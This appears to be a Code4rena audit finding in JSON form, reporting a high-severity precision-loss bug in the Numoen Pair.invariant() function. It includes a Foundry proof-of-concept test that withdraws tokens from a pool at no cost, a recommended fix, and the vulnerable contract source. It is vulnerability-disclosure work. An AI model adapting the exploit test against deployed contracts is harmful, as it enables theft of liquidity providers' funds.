{
  "Title": "[H-01] Precision loss in the invariant function can lead to loss of funds",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-numoen/blob/2ad9a73d793ea23a25a381faadc86ae0c8cb5913/src/core/Pair.sol#L56\n\n\n# Vulnerability details\n\n## Impact\nAn attacker can steal the funds without affecting the invariant.\n\n## Proof of Concept\nWe can say the function `Pair.invariant()` is the heart of the protocol.\nAll the malicious trades should be prevented by this function.\n```solidity\nPair.sol\n52:   /// @inheritdoc IPair\n53:   function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {\n54:     if (liquidity == 0) return (amount0 == 0 && amount1 == 0);\n55:\n56:     uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;//@audit-info precison loss\n57:     uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;//@audit-info precison loss\n58:\n59:     if (scale1 > 2 * upperBound) revert InvariantError();\n60:\n61:     uint256 a = scale0 * 1e18;\n62:     uint256 b = scale1 * upperBound;\n63:     uint256 c = (scale1 * scale1) / 4;\n64:     uint256 d = upperBound * upperBound;\n65:\n66:     return a + b >= c + d;\n67:   }\n\n```\nThe problem is there is a precision loss in the L56 and L57.\nThe precision loss can result in the wrong invariant check result.\nLet's say the `token0` has 6 decimals and liquidity has more than 24 decimals.\nThen the first `FullMath.mulDiv` will cause significant rounding before it's converted to D18.\nTo clarify the difference I wrote a custom function `invariant()` to see the actual value of `a+b-c-d`.\n```\n  function invariant(uint256 amount0, uint256 amount1, uint256 liquidity, uint256 token0Scale, uint256 token1Scale) public view returns (uint256 res) {\n    if (liquidity == 0) {\n        require (amount0 == 0 && amount1 == 0);\n        return 0;\n    }\n\n    // uint256 scale0 = FullMath.mulDiv(amount0* token0Scale, 1e18, liquidity) ;\n    // uint256 scale1 = FullMath.mulDiv(amount1* token1Scale, 1e18, liquidity) ;\n    uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;\n    uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;\n\n    if (scale1 > 2 * upperBound) revert();\n\n    uint256 a = scale0 * 1e18;\n    uint256 b = scale1 * upperBound;\n    uint256 c = (scale1 * scale1) / 4;\n    uint256 d = upperBound * upperBound;\n\n    res = a + b - c - d;\n  }\n\n  function testAudit1() external\n  {\n    uint256 x = 1*10**6;\n    uint256 y = 2 * (5 * 10**24 - 10**21);\n    uint256 liquidity = 10**24;\n    uint256 token0Scale=10**12;\n    uint256 token1Scale=1;\n    emit log_named_decimal_uint(\"invariant\", invariant(x, y, liquidity, token0Scale, token1Scale), 36);\n\n    x = 1.5*10**6;\n    emit log_named_decimal_uint(\"invariant\", invariant(x, y, liquidity, token0Scale, token1Scale), 36);\n  }\n```\nPut these two functions in the `LiquidityManagerTest.t.sol` and run the case.\nThe result is as below and it shows that while the reserve0 amount changes to 150%, the actual value `a+b-c-d` does not change.\n\n```\nF:\\SOL\\Code\\Code4rena\\2023-01-numoen>forge test -vv --match-test testAudit1\n[â ’] Compiling...\nNo files changed, compilation skipped\n\nRunning 1 test for test/LiquidityManagerTest.t.sol:LiquidityManagerTest\n[PASS] testAudit1() (gas: 10361)\nLogs:\n  invariant: 0.000000000000000000000000000000000000\n  invariant: 0.000000000000000000000000000000000000\n\nTest result: ok. 1 passed; 0 failed; finished in 5.74ms\n```\n\nSo what does this mean? We know that if `a+b-c-d` is positive, it means anyone can call `swap()` to withdraw the excess value.\nThe above test shows that the significant change in the token0 reserve amount did not change the value `a+b-c-d`.\nBased on this, I wrote an attack case where dennis pulls 0.5*10**6 token0 without cost while the invariant stays at zero.\nAlthough the benefit is only 0.5 USDC for this test case, this shows a possibility drawing value without affecting the invariant for pools with low decimals.\n\n```solidity\n  function testAttack() external\n  {\n    // token0 is USDC\n    token0Scale = 6;\n    token1Scale = 18;\n\n    // cuh adds liquidity\n    lendgine = Lendgine(factory.createLendgine(address(token0), address(token1), token0Scale, token1Scale, upperBound));\n\n    uint256 amount0 = 1.5*10**6;\n    uint256 amount1 = 2 * (5 * 10**24 - 10**21);\n    uint256 liquidity = 10**24;\n\n    token0.mint(cuh, amount0);\n    token1.mint(cuh, amount1);\n\n    vm.startPrank(cuh);\n    token0.approve(address(liquidityManager), amount0);\n    token1.approve(address(liquidityManager), amount1);\n\n    liquidityManager.addLiquidity(\n      LiquidityManager.AddLiquidityParams({\n        token0: address(token0),\n        token1: address(token1),\n        token0Exp: token0Scale,\n        token1Exp: token1Scale,\n        upperBound: upperBound,\n        liquidity: liquidity,\n        amount0Min: amount0,\n        amount1Min: amount1,\n        sizeMin: 0,\n        recipient: cuh,\n        deadline: block.timestamp\n      })\n    );\n    vm.stopPrank();\n    showLendgineInfo();\n\n    // dennis starts with zero token\n    assertEq(token0.balanceOf(dennis), 0);\n\n    // dennis pulls 0.5 USDC free\n    lendgine.swap(\n      dennis,\n      5*10**5,\n      0,\n      abi.encode(\n        SwapCallbackData({token0: address(token0), token1: address(token1), amount0: 0, amount1: 0, payer: dennis})\n      )\n    );\n\n    showLendgineInfo();\n\n    // assert\n    assertEq(token0.balanceOf(dennis), 5*10**5);\n  }\n```\n## Tools Used\nFoundry\n\n## Recommended Mitigation Steps\nMake sure to multiply first before division to prevent precision loss.\n```solidity\n  /// @inheritdoc IPair\n  function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {\n    if (liquidity == 0) return (amount0 == 0 && amount1 == 0);\n\n    uint256 scale0 = FullMath.mulDiv(amount0 * token0Scale, 1e18, liquidity) ;//@audit-info change here\n    uint256 scale1 = FullMath.mulDiv(amount1 * token1Scale, 1e18, liquidity) ;//@audit-info change here\n\n    if (scale1 > 2 * upperBound) revert InvariantError();\n\n    uint256 a = scale0 * 1e18;\n    uint256 b = scale1 * upperBound;\n    uint256 c = (scale1 * scale1) / 4;\n    uint256 d = upperBound * upperBound;\n\n    return a + b >= c + d;\n  }\n\n```",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2023-01-numoen-contest",
  "Code": [
    {
      "filename": "src/core/Pair.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-only\npragma solidity ^0.8.4;\n\nimport { ImmutableState } from \"./ImmutableState.sol\";\nimport { ReentrancyGuard } from \"./ReentrancyGuard.sol\";\n\nimport { IPair } from \"./interfaces/IPair.sol\";\nimport { IPairMintCallback } from \"./interfaces/callback/IPairMintCallback.sol\";\nimport { ISwapCallback } from \"./interfaces/callback/ISwapCallback.sol\";\n\nimport { Balance } from \"../libraries/Balance.sol\";\nimport { FullMath } from \"../libraries/FullMath.sol\";\nimport { SafeCast } from \"../libraries/SafeCast.sol\";\nimport { SafeTransferLib } from \"../libraries/SafeTransferLib.sol\";\n\nabstract contract Pair is ImmutableState, ReentrancyGuard, IPair {\n  /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n  event Mint(uint256 amount0In, uint256 amount1In, uint256 liquidity);\n\n  event Burn(uint256 amount0Out, uint256 amount1Out, uint256 liquidity, address indexed to);\n\n  event Swap(uint256 amount0Out, uint256 amount1Out, uint256 amount0In, uint256 amount1In, address indexed to);\n\n  /*//////////////////////////////////////////////////////////////\n                                 ERRORS\n    //////////////////////////////////////////////////////////////*/\n\n  error InvariantError();\n\n  error InsufficientOutputError();\n\n  /*//////////////////////////////////////////////////////////////\n                                 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n  /// @inheritdoc IPair\n  uint120 public override reserve0;\n\n  /// @inheritdoc IPair\n  uint120 public override reserve1;\n\n  /// @inheritdoc IPair\n  uint256 public override totalLiquidity;\n\n  /*//////////////////////////////////////////////////////////////\n                              PAIR LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n  /// @inheritdoc IPair\n  function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {\n    if (liquidity == 0) return (amount0 == 0 && amount1 == 0);\n\n    uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;\n    uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;\n\n    if (scale1 > 2 * upperBound) revert InvariantError();\n\n    uint256 a = scale0 * 1e18;\n    uint256 b = scale1 * upperBound;\n    uint256 c = (scale1 * scale1) / 4;\n    uint256 d = upperBound * upperBound;\n\n    return a + b >= c + d;\n  }\n\n  /// @dev assumes liquidity is non-zero\n  function mint(uint256 liquidity, bytes calldata data) internal {\n    uint120 _reserve0 = reserve0; // SLOAD\n    uint120 _reserve1 = reserve1; // SLOAD\n    uint256 _totalLiquidity = totalLiquidity; // SLOAD\n\n    uint256 balance0Before = Balance.balance(token0);\n    uint256 balance1Before = Balance.balance(token1);\n    IPairMintCallback(msg.sender).pairMintCallback(liquidity, data);\n    uint256 amount0In = Balance.balance(token0) - balance0Before;\n    uint256 amount1In = Balance.balance(token1) - balance1Before;\n\n    if (!invariant(_reserve0 + amount0In, _reserve1 + amount1In, _totalLiquidity + liquidity)) {\n      revert InvariantError();\n    }\n\n    reserve0 = _reserve0 + SafeCast.toUint120(amount0In); // SSTORE\n    reserve1 = _reserve1 + SafeCast.toUint120(amount1In); // SSTORE\n    totalLiquidity = _totalLiquidity + liquidity; // SSTORE\n\n    emit Mint(amount0In, amount1In, liquidity);\n  }\n\n  /// @dev assumes liquidity is non-zero\n  function burn(address to, uint256 liquidity) internal returns (uint256 amount0, uint256 amount1) {\n    uint120 _reserve0 = reserve0; // SLOAD\n    uint120 _reserve1 = reserve1; // SLOAD\n    uint256 _totalLiquidity = totalLiquidity; // SLOAD\n\n    amount0 = FullMath.mulDiv(_reserve0, liquidity, _totalLiquidity);\n    amount1 = FullMath.mulDiv(_reserve1, liquidity, _totalLiquidity);\n    if (amount0 == 0 && amount1 == 0) revert InsufficientOutputError();\n\n    if (amount0 > 0) SafeTransferLib.safeTransfer(token0, to, amount0);\n    if (amount1 > 0) SafeTransferLib.safeTransfer(token1, to, amount1);\n\n    // Extra check of the invariant\n    if (!invariant(_reserve0 - amount0, _reserve1 - amount1, _totalLiquidity - liquidity)) revert InvariantError();\n\n    reserve0 = _reserve0 - SafeCast.toUint120(amount0); // SSTORE\n    reserve1 = _reserve1 - SafeCast.toUint120(amount1); // SSTORE\n    totalLiquidity = _totalLiquidity - liquidity; // SSTORE\n\n    emit Burn(amount0, amount1, liquidity, to);\n  }\n\n  /// @inheritdoc IPair\n  function swap(address to, uint256 amount0Out, uint256 amount1Out, bytes calldata data) external override nonReentrant {\n    if (amount0Out == 0 && amount1Out == 0) revert InsufficientOutputError();\n\n    uint120 _reserve0 = reserve0; // SLOAD\n    uint120 _reserve1 = reserve1; // SLOAD\n\n    if (amount0Out > 0) SafeTransferLib.safeTransfer(token0, to, amount0Out);\n    if (amount1Out > 0) SafeTransferLib.safeTransfer(token1, to, amount1Out);\n\n    uint256 balance0Before = Balance.balance(token0);\n    uint256 balance1Before = Balance.balance(token1);\n    ISwapCallback(msg.sender).swapCallback(amount0Out, amount1Out, data);\n    uint256 amount0In = Balance.balance(token0) - balance0Before;\n    uint256 amount1In = Balance.balance(token1) - balance1Before;\n\n    if (!invariant(_reserve0 + amount0In - amount0Out, _reserve1 + amount1In - amount1Out, totalLiquidity)) {\n      revert InvariantError();\n    }\n\n    reserve0 = _reserve0 + SafeCast.toUint120(amount0In) - SafeCast.toUint120(amount0Out); // SSTORE\n    reserve1 = _reserve1 + SafeCast.toUint120(amount1In) - SafeCast.toUint120(amount1Out); // SSTORE\n\n    emit Swap(amount0Out, amount1Out, amount0In, amount1In, to);\n  }\n}"
    }
  ]
}